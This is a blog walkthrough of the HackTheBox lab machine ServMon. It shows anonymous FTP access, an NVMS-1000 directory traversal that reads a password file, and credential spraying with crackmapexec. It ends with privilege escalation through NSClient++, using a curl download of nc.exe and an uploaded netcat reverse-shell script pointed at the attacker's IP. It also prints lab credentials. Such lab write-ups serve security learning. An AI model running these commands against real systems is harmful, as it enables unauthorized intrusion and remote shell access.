---
header:
    teaser: /assets/images/servmoncard.jpg
title: "HTB Walkthough: Servmon"
layout: single
date: 2020-06-21 10:27
categories: [Walkthroughs, Ethical Hacking]
toc: true
toc_label: "Table of Contents"
---

This was one of my first boxes that I rooted on the HackTheBox platform, with it being retired on the 20th June 2020.
For the those unaware Hack The Box (HTB) Is a platform that allows users to exploit vulnerabilities in a range of machines in a legal manner, whilst most do it for fun it can also be a good avenue to test your ability and knowledge. 

# Nmap Scanning

As with all targets it's vital to start collecting information on what's open to get an idea of what's going on, nmap is a port scanner that will return information about the open ports on the target(s). Running nmap against ServMon, IP 10.10.10.184

    nmap -p- -T4 10.10.10.184

This returned the following ports:
![nmap](/assets/images/servmon/servmonnmap.png)

## Open Ports

I could've used the switch -A to run the aggressive scan as it's a learning enviornment and I'm not worried about how loud I'm being, -A would return version information and OS information if we didn't already know, it's rather 'loud' and would commonly be detected. But let's take a look at what we've got going on here;

1. Port 21: File Transfer Protocol (FTP) The name gives this away but it's used to transfer files, always a good idea to test for anonymous login here.
2. Port 22: SSH, normally not too much worth looking at to begin with as commonly you'll need credentials to get in. Could always attempt a brute force if we don't find anything later
3. Port 80: HTTP, indicates that a website is being hosted at 10.10.10.184:80 
4. Ports 135, 139, 445: These ports cover the SMB protocol which is another file hosting protocol, commonly file sharing internally.
6. Port 8443: Alternate HTTPS, this would indicate that there is another website, or service being hosted at 10.10.10.184:8443
7. Unkowns: The rest of the ports aren't inuse for any common services, may be worth checking out if we don't find any info on the above ports.

# Enumeration

I always aim to hit the 'big targets' or 'low hanging fruit' first, ports/services that fall into this category consist of FTP, HTTP/HTTPs, SMB etc. They're commonly quick to check without getting into a rabbit hole. 

## FTP (21)

With ftp it's always an option to see if you can connect anonymously, sometimes you may even be able to upload files anonymously. Typically if you can, this is bad, there are some legitimate reasons to have anonymous login enabled, however, it leaves a massive attack vector open.

    ftp 10.10.10.184

![ftp](/assets/images/servmon/servmonftpanon.png)

You can see we have anonymous access to login. We know that the box is a windows machine and using 'pwd' we find out that we are in the root directory, or the C: drive in windows speak. From some knowledge of Windows systems we know the file structures, so attempting to change the users directory which sits at C:\Users\ returns a success

    cd /users

Using ls or DIR here would display that there are two users; Nathan and Nadine. we can repeat the above steps to change into their directories;

**Nadine**

Running ls in Nadines directory shows the file 'Confidential.txt' using the 'get' command we can download this file to our machine to see it's contents

![catNadine](/assets/images/servmon/servmoncatnadine.png)

This gives us a clue that there may be a file of interest on Nathan's desktop. Keep this in mind for later.

**Nathan**

Running ls in Nathans directory also returns a file 'Notes to do.txt', the same process of using the 'get' command and viewing it's contents.

![catnathan](/assets/images/servmon/servmoncatnathan.png)

This shows that the passwords are not uploaded, meaning that chances are they are still on Nathan's desktop. C:\Users\Nathan\Desktop\passwords.txt or something similar. We also learn about an application called NVMS which is more information we can use.
There doesn't appear to be much more we can do with the FTP service for now, but useful notes to keep in mind.

## HTTP (80)

As this is the standard HTTP port opening up a browser and navigating to: http://10.10.10.184 provides us with the following page:

![defaulthttp](/assets/images/servmon/servmonhttpdefault.png)

As always with a login box it's a good idea to try some default credentials: admin:admin, admin:password etc. In this case nothing worked for us here, and googling for 'NVMS-1000 default credentials' turned up empty. Changing our search to just 'NVMS-1000' pointed us towards [this exploit](https://www.exploit-db.com/exploits/47774) from exploitdb. The exploit seems to be related to directory traversal and simply intercepting the traffic using burp suite, editing the path and sending it on.

## SMB (135, 139, 445)

I did attempt to connect and list the SMB shares, whilst I could list them I didn't have any access to them at this stage

## SSH (22)

Similarly to SMB, I didn't have any credentials at this stage which were valid here.

# Exploitation

Continuing from the HTTP enumeration I will be carrying out the directory traversal exploitation and see where it ends up.

## Directory Traversal

Setting up burp suite with proxy intercept on I caught the traffic being sent when we attempt to load the login page, I sent this to the repeater tool to carry out this exploit.

![directorytraversal](/assets/images/servmon/servmondirectory.png)

This shows us we can perform this exploit and as per the example on exploitDB and shown in the response, we can list out the contents of C:\Windows\win.ini... Great... I guess. 
Let's see if we can change that to the potential password file that we know *should* be on Nathan's desktop.

![passwordlist](/assets/images/servmon/servmonpasswordlist.png)

Bingo! A list of what looks to be passwords. I spent way too long coding these into base64, combining them with the username and attempting to send them on through burpsuite to get into the web app. Way. Too. Long. Spolier: It didn't work.

So instead, I saved the passwords to a file called pass.txt and decided to see if they worked elsewhere utilising a tool called crackmapexec. You'll need to install crackmapexec but that isn't too hard:

    apt install crackmapexec

Ta-da!

With crackmapexec installed the syntax is pretty straightforward

    crackmapexec <service(smb/ssh)> <TargetIP> -u <Username OR Usernamefile> -p <password OR passwordfile>

![crackmap](/assets/images/servmon/servmoncrackmap.png)

Ah... perfection, we have some valid credentials across both SSH and SMB. 

**Username: Nadine**

**Password: L1k3B1gBut7s@W0rk**

Er.. Sure, each to their own.

We can try these details to login via SSH and if successful we should be able to grab the user flag off the desktop.

![userflag](/assets/images/servmon/servmonuser.png)


# Privilege Escalation

Now time for the fun part, taking our low level user and gaining root.


## Enumeration, Post-Compromise

That's it folks. Rinse. Repeat. Once we get access we treat the system as if we were an external user again and see what we are working with, the benefit we have is we have access to poke around the file system and installed programs. This is where I like to start, making sure that there is nothing glaringly obvious right off the bat.

Taking a look around the users directories there isn't anything too interesting here, but over in C:\Program Files\ there is something which catches my eye. A program called 'NSClient++' which isn't installed by default with Windows, anything 'non-standard' is normally worth checking out. If we find a program there are two searches that I like to perform, one being to find any potential docs or guides on the programs setup or interacting with the program. Secondly, to see if there are any known exploits with it from a trusted source such as exploitdb/rapid7 etc.

In our case we have results on both accounts:

[https://docs.nsclient.org/](https://docs.nsclient.org/)

[https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)

The exploit is a 7 step process which involves grabbing an admin password from a config file, setting up a malicious script and executing it.

## Exploitation: Part One. File Prepartion and Connection

We can view the contents of the nsclient.ini file @ C:\Program Files\NSClient++\nsclient.ini to retrieve the admin password stored in... yeah, plain text. 10/10 Security.

The web admin password is: **ew2x6SsGTxjRwXOT**

Before we login and attempt to execute anything we need to first get the files to run our exploit ready, from Step 3 of the exploit it seems that we will need to get nc.exe onto the host. In order to do this I preped nc.exe on the attacking machine and then hosted a simple http server using python:

    python3 -m http.server 8080

with this running I retrieved the files using curl after navigating to C:\temp on the target machine.

    curl http://10.10.15.248:8080/nc.exe --output nc.exe

**Note:** If you plan to use the WebUI to exploit this then you will want to make the evil.bat file and also place this on the temp drive using the same process, I used the API so skipped this step.

In the nsclient.ini file we also spot the 'Allowed hosts' section as being 127.0.0.1 which is the local host. How are we going to connect as if we are present on the machine itself.. After a bit of googling it looked as if we can use SSH port forwarding using the following command:

    ssh -L 7777:127.0.0.1:8443 Nadine@10.10.10.184

Essentially what we are saying is, Open an SSH connection as Nadine to 10.10.10.184 BUT, any traffic we send on our machine over 7777, send it via 127.0.0.1:8443. Testing this in the web browser entering: https://127.0.0.1:7777 returned the following logon page

![nsclient++](/assets/images/servmon/servmonnsclient.png)

Once logged in with the web admin's password we can gain confirmation that the stated services (CheckExternalScripts and Scheduler) are enabled, and they are. This information is also present in the ini file.

![servicecheck](/assets/images/servmon/servmonassetcheck.png)

**Note:** I was attacking this as a free user and as such had to deal with multi-user instances occurring, there were a lot of instability issues and leftover files/bat files from previous users.

## Exploitation: Part Two. Execution.

First things first we have to set up our listener to catch our shell, I forgot once, it wasn't a good time. Don't be like me. Learn from my mistakes. Open a new terminal tab on the attacking machine:

    nc -nvlp 5555

5555 is the port we are listening on, this has to match the port outlined in the evil.bat script we are uploading, and also have nothing else on the sytem using it!

I spent far too long trying to get the WebUI to behave itself I got so fed up I went to the forums to rant, on doing so I found that I wasn't alone and the solution seemed to be to use the API. So to the docs we go!

In the documentation aptly under [https://docs.nsclient.org/api/rest/scripts](https://docs.nsclient.org/api/rest/scripts) there is a section about using curl to upload external scripts to the program, it literally gives you the command. Amazing. Well, we have to add our script to the --data-binary command but I'll take what we're given.

Anyhow:

    curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.15.248 5555 -e cmd.exe"

Again, the IP address of "10.10.15.248" and the port "5555" will need to be changed to match your machines IP and the port of your choice.

We were prompted for the admin password, enter that from above and you should receive the message: "Added evil as scripts\evil.bat"

I tried to follow the commands to execute the script using the API but was met with a big fat no.

![errorexecute](/assets/images/servmon/servmonexe.png)

Demoralised and confused as to why it wouldn't run I decided, by chance, to query the list of scripts to see what was there... 

    curl -s -k -u admin https://localhost:8443/api/v1/queries

Again entering the password for the web admin password, but this time the command line just hung. So I checked my listener and to my surprise a shell!

Running whoami to see the fruits of my labour:

![authsystem](/assets/images/servmon/servmonsystem.png)

Grabbing the root flag:

![rootflag](/assets/images/servmon/servmonroot.png)

And that's that. Servmon rooted, thanks for reading. This box taught me a lot ranging from SSH forwarding to using curl to download files and interact with APIs.

